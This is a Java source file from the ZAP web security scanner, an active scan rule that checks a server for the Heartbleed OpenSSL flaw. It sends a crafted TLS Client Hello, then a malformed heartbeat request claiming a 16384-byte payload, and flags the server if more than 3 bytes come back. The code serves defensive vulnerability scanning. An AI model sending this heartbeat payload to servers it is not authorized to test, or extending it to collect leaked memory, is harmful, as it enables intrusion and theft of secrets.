/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;

import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractHostPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;

/**
 * A class to actively check if the web server is vulnerable to the HeartBleed OpenSSL vulnerability
 * Based on https://github.com/musalbas/heartbleed-masstest/blob/master/ssltest.py
 * since the developer there "disclaims copyright to this source code."
 * 
 * @author 70pointer
 *
 */
public class HeartBleedActiveScanner extends AbstractHostPlugin {

	/**
	 * the logger object
	 */
	private static Logger log = Logger.getLogger(HeartBleedActiveScanner.class);

	/**
	 * Prefix for internationalized messages used by this rule
	 */
	private static final String MESSAGE_PREFIX = "ascanalpha.heartbleed.";

	/**
	 * the value for the handshake record 
	 */
	static final byte handshakeRecordBuffer[] = {0x16};

	/** 
	 * all the various SSL, TLS, and DTLS versions that we will try
	 */
	static final String [] tlsNames =     { "SSL 2.0",    "SSL 3.0",     "TLS 1.0",   "TLS 1.1",    "TLS 1.2",     "DTLS 1.0"};

	/**
	 * the binary codes for the various SSL, TLS, and DTLS versions that we will try
	 */
	static final byte [] [] tlsBuffers = {{0x00, 0x02}, {0x03, 0x00}, {0x03, 0x01}, {0x03, 0x02}, {0x03, 0x03}, {(byte)0xfe, (byte)0xff}};

	/**
	 * the HELLO request that we wills end to say "Hello" to the SSL server
	 */
	static final byte [] helloBuffer = {
		//time1        time2      time3        time4     5 random (to EOL)
		(byte)0x00, (byte)0xdc, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0xd8, (byte)0x03, (byte)0x02, (byte)0x53,

		//another 16 random
		(byte)0x43, (byte)0x5b, (byte)0x90, (byte)0x9d, (byte)0x9b, (byte)0x72, (byte)0x0b, (byte)0xbc,  (byte)0x0c, (byte)0xbc, (byte)0x2b, (byte)0x92, (byte)0xa8, (byte)0x48, (byte)0x97, (byte)0xcf,
		//another  7 random                                                            ||
		(byte)0xbd, (byte)0x39, (byte)0x04, (byte)0xcc, (byte)0x16, (byte)0x0a, (byte)0x85, (byte)0x03,  (byte)0x90, (byte)0x9f, (byte)0x77, (byte)0x04, (byte)0x33, (byte)0xd4, (byte)0xde, (byte)0x00,
		//---num ciphers*2----    cipher suites "supported" by the client
		(byte)0x00, (byte)0x66, (byte)0xc0, (byte)0x14, (byte)0xc0, (byte)0x0a, (byte)0xc0, (byte)0x22,  (byte)0xc0, (byte)0x21, (byte)0x00, (byte)0x39, (byte)0x00, (byte)0x38, (byte)0x00, (byte)0x88,
		(byte)0x00, (byte)0x87, (byte)0xc0, (byte)0x0f, (byte)0xc0, (byte)0x05, (byte)0x00, (byte)0x35,  (byte)0x00, (byte)0x84, (byte)0xc0, (byte)0x12, (byte)0xc0, (byte)0x08, (byte)0xc0, (byte)0x1c,
		(byte)0xc0, (byte)0x1b, (byte)0x00, (byte)0x16, (byte)0x00, (byte)0x13, (byte)0xc0, (byte)0x0d,  (byte)0xc0, (byte)0x03, (byte)0x00, (byte)0x0a, (byte)0xc0, (byte)0x13, (byte)0xc0, (byte)0x09,
		(byte)0xc0, (byte)0x1f, (byte)0xc0, (byte)0x1e, (byte)0x00, (byte)0x33, (byte)0x00, (byte)0x32,  (byte)0x00, (byte)0x9a, (byte)0x00, (byte)0x99, (byte)0x00, (byte)0x45, (byte)0x00, (byte)0x44,
		(byte)0xc0, (byte)0x0e, (byte)0xc0, (byte)0x04, (byte)0x00, (byte)0x2f, (byte)0x00, (byte)0x96,  (byte)0x00, (byte)0x41, (byte)0xc0, (byte)0x11, (byte)0xc0, (byte)0x07, (byte)0xc0, (byte)0x0c,
		(byte)0xc0, (byte)0x02, (byte)0x00, (byte)0x05, (byte)0x00, (byte)0x04, (byte)0x00, (byte)0x15,  (byte)0x00, (byte)0x12, (byte)0x00, (byte)0x09, (byte)0x00, (byte)0x14, (byte)0x00, (byte)0x11,
		//                                                                                   last cphr	 #compr mthd      null   --- # data exts ------
		(byte)0x00, (byte)0x08, (byte)0x00, (byte)0x06, (byte)0x00, (byte)0x03, (byte)0x00, (byte)0xff,  (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x49, (byte)0x00, (byte)0x0b, (byte)0x00, (byte)0x04,
		(byte)0x03, (byte)0x00, (byte)0x01, (byte)0x02, (byte)0x00, (byte)0x0a, (byte)0x00, (byte)0x34,  (byte)0x00, (byte)0x32, (byte)0x00, (byte)0x0e, (byte)0x00, (byte)0x0d, (byte)0x00, (byte)0x19,
		(byte)0x00, (byte)0x0b, (byte)0x00, (byte)0x0c, (byte)0x00, (byte)0x18, (byte)0x00, (byte)0x09,  (byte)0x00, (byte)0x0a, (byte)0x00, (byte)0x16, (byte)0x00, (byte)0x17, (byte)0x00, (byte)0x08,
		(byte)0x00, (byte)0x06, (byte)0x00, (byte)0x07, (byte)0x00, (byte)0x14, (byte)0x00, (byte)0x15,  (byte)0x00, (byte)0x04, (byte)0x00, (byte)0x05, (byte)0x00, (byte)0x12, (byte)0x00, (byte)0x13,
		(byte)0x00, (byte)0x01, (byte)0x00, (byte)0x02, (byte)0x00, (byte)0x03, (byte)0x00, (byte)0x0f,  (byte)0x00, (byte)0x10, (byte)0x00, (byte)0x11, (byte)0x00, (byte)0x23, (byte)0x00, (byte)0x00,
		(byte)0x00, (byte)0x0f, (byte)0x00, (byte)0x01, (byte)0x01      
	};

	/**
	 * the beartbeat request that we will send to 
	 */
	static final byte heartbeatBuffer [] = {
		0x18, 			// Typ = 0x18 = HEARTBEAT_RECORD_TYPE 
		0x03, 0x02, 	// ?? (Looks like TLS version numbers, but is not)
		0x00, 0x03,		// Len = 0x00 0x03 = 3 in decimal
		0x01, 			// ???
		0x40, 0x00		// 0x40 0x00 = 16384 in decimal (the length of data we get back)
	};


	/**
	 * returns the plugin id
	 */
	@Override
	public int getId() {
		return 20015;
	}

	/**
	 * returns the name of the plugin
	 */
	@Override
	public String getName() {
		return Constant.messages.getString(MESSAGE_PREFIX + "name");
	}

	@Override
	public String[] getDependency() {
		return null;
	}

	@Override
	public String getDescription() {
		return Constant.messages.getString(MESSAGE_PREFIX + "desc");
	}

	@Override
	public int getCategory() {
		return Category.INFO_GATHER;
	}

	@Override
	public String getSolution() {
		return Constant.messages.getString(MESSAGE_PREFIX + "soln");
	}

	@Override
	public String getReference() {
		return Constant.messages.getString(MESSAGE_PREFIX + "refs");
	}

	@Override
	public void init() {
	}


	/**
	 * scans the node for the vulnerability	
	 */
	@Override
	public void scan() {

		try {
			//get the network details for the attack
			String hostname = this.getBaseMsg().getRequestHeader().getURI().getHost();
			int portnumber = this.getBaseMsg().getRequestHeader().getURI().getPort();
			//use the default HTTPS port, if the URI did not contain an explicit port number
			//or if the URL was via HTTP, rather than via HTTPS (yes, we will still check it)
			if ( portnumber == -1 || portnumber == 80)
				portnumber=443;  
			//String scheme = this.getBaseMsg().getRequestHeader().getURI().getScheme();
			//if (! scheme.equalsIgnoreCase("https")) {
			//	if (log.isDebugEnabled()) log.debug("Scheme "+ scheme +" does not indicate the use of SSL");
			//	return;
			//}

			if (log.isDebugEnabled()) 
				log.debug("About to look for HeartBleed on "+ hostname + ":"+ portnumber);
			for (int tlsIndex = 0; tlsIndex < tlsBuffers.length; tlsIndex ++) { 
				if (log.isDebugEnabled()) 
					log.debug("Trying for "+tlsNames[tlsIndex]);

				Socket socket = null;
				OutputStream os = null;
				InputStream is = null;
				try {
					//establish a raw socket connection, without proxying it (the request will definitely not appear in Zap's history tab)
					socket = new Socket();
					try {
						socket.connect(new InetSocketAddress(hostname, portnumber), 2000);  //2 second timeout
						if (log.isDebugEnabled()) 
							log.debug("Connected");
					}
					catch (Exception e) {
						//we cannot connect at all.. no point in continuing.
						log.error("Cannot establish a socket connection to "+ hostname + ":"+ portnumber + " for HeartBleed");
						return;							
					}

					//get the streams
					os = socket.getOutputStream();
					is = socket.getInputStream();

					//send the client Hello
					os.write(HeartBleedActiveScanner.handshakeRecordBuffer);
					os.write(HeartBleedActiveScanner.tlsBuffers[tlsIndex]);
					os.write(HeartBleedActiveScanner.helloBuffer);
					if (log.isDebugEnabled()) 
						log.debug("Wrote the Client Hello");

					//read through messages until we get a handshake message from the server
					//and the first byte is 0x0E (I can't recall what this is now. Sorry!)
					while (true) {
						SSLInternal sslMessage= recvmsg (is, 2000);  //2 second timeout
						if (sslMessage.typ == 0x16 && sslMessage.len >0 && sslMessage.pay[0] == 0x0E )
							break; 
					}
					
					if (log.isDebugEnabled()) 
						log.debug("Got the Server Hello");
					
					//all the SSL initialisation is complete.  So is the SSL server vulnerable?
					boolean vulnerable = isVulnerable (is, os, 2000);  //2 second timeout on the check for each of SSL: 2.0, SSL 3.0, etc
					if (vulnerable) {
						if (log.isDebugEnabled()) 
							log.debug("Vulnerable");
						//bingo!
						String extraInfo = Constant.messages.getString(MESSAGE_PREFIX + "extrainfo", tlsNames[tlsIndex]);
						bingo(getRisk(), Alert.WARNING, getName(), getDescription(),
								getBaseMsg().getRequestHeader().getURI().getURI(),
								"",  //param 
								"",  //attack
								extraInfo, 
								getSolution(), 
								"",  //evidence
								getBaseMsg());
					}
					if (is != null) is.close();
					if (os != null) os.close();
					if (socket != null) socket.close();
				}
				catch (Exception e) {
					//this particular variant is not vulnerable. skip to the next one..
					if (log.isDebugEnabled()) 
						log.debug("The SSL server does not appear to be vulnerable, using "+tlsNames[tlsIndex]);
				}
				finally {
					if (log.isDebugEnabled()) 
						log.debug("Tidying up");
					if (is != null) is.close();
					if (os != null) os.close();
					if (socket != null) socket.close();	
				}					
			}
		} catch (Exception e) {
			//needed to catch exceptions from the "finally" statement 
			log.error("Error scanning a node for HeartBleed: " + e.getMessage(), e);
		}
	}

	@Override
	public int getRisk() {
		return Alert.RISK_HIGH; 
	}

	@Override
	public int getCweId() {
		return 119;  //CWE 119: Failure to Constrain Operations within the Bounds of a Memory Buffer
	}

	@Override
	public int getWascId() {
		return 20; //WASC-20: Improper Input Handling
	}

	/**
	 * determines if the SSL server behind the streams is vulnerable based on its response to malformed heartbeat message
	 * @param is
	 * @param os
	 * @return true or false
	 * @throws IOException
	 */
	boolean isVulnerable (InputStream is, OutputStream os, int timeoutMs) throws IOException{
		
		//send the heartbeat request first, then start the clock ticking. tick tock, tick tock.
		os.write(HeartBleedActiveScanner.heartbeatBuffer);
		
		long startTime = System.currentTimeMillis();
		long timeoutTime = startTime + timeoutMs;
		long currentTime = startTime;
				
		while (true && currentTime <= timeoutTime) {
			SSLInternal sslMessage = recvmsg (is, timeoutMs);
			if ( sslMessage.typ == 0x18  ) { //24
				//received the heartbeat response
				if ( sslMessage.len > 3 ) { 
					//Got > 3 bytes back. Vulnerable.
					return true;
				}
				else	{
					//Got <=3 bytes back. NOT Vulnerable.
					return false;
				}
			}
			if ( sslMessage.typ == 0x15) {  //21
				//server returned alert/error. unlikely to be vulnerable
				return false;
			}
			currentTime = System.currentTimeMillis();
		}
		//timed out.. and we haven't received a response to the heartvbeat.. not vulnerable
		return false;
	}
	/**
	 * reads an SSL message from the inputstream 
	 * @param is
	 * @param timeoutMs the timeout in milliseconds
	 * @return
	 * @throws IOException
	 */
	static SSLInternal recvmsg (InputStream is, int timeoutMs) throws IOException {
		byte [] messageHeader = recvall (is, 5, timeoutMs);

		//convert the 5 bytes to (big endian) 1 unsigned byte type, 2 unsigned bytes ver, 2 unsigned bytes len
		ByteBuffer bb = ByteBuffer.wrap(messageHeader);
		byte type = bb.get();
		short ver = bb.getShort();
		short len = bb.getShort();

		//read the specified number of bytes from the inputstream
		byte [] messagePayload = recvall(is, len, timeoutMs);
		return new SSLInternal (type, ver, len, messagePayload);
	}

	/**
	 * reads the requested number of bytes from the inputstream, blocking if necessary
	 * @param s the inputstream from which to read
	 * @param length the number of bytes to reas
	 * @return a byte array containing the requested number of bytes from the inputstream
	 * @throws IOException
	 */
	static byte [] recvall (InputStream s, int length, int timeoutMs) throws IOException {
		long startTime = System.currentTimeMillis();
		long timeoutTime = startTime + timeoutMs;
		long currentTime = startTime;
		
		byte [] buffer = new byte [length];
		int remainingtoread=length;
		while ( remainingtoread > 0 && currentTime <= timeoutTime) {			
			int read = s.read(buffer,length - remainingtoread, remainingtoread);
			if (read != -1 )
				remainingtoread -= read;
			else
				throw new IOException ("Failed to read " + length +" bytes. Read " + new Integer (length - remainingtoread) + " bytes");
			currentTime = System.currentTimeMillis();
		}
		//did we time out?
		if (currentTime >= timeoutTime)
			throw new IOException ("Failed to read " + length +" bytes in "+ timeoutMs +"ms due to a timeout. Read " + new Integer (length - remainingtoread) + " bytes");
		return buffer;	
	}
	/**
	 * a helper class used to pass internal SSL details around
	 *  
	 * @author 70pointer@gmail.com
	 */
	public static class SSLInternal {
		public byte typ;
		public short ver;
		public short len;
		public byte [] pay;

		SSLInternal (byte typ, short ver, short len, byte [] pay) {
			this.typ = typ;
			this.ver = ver;
			this.len = len;
			this.pay = pay;
		} 
	}
}
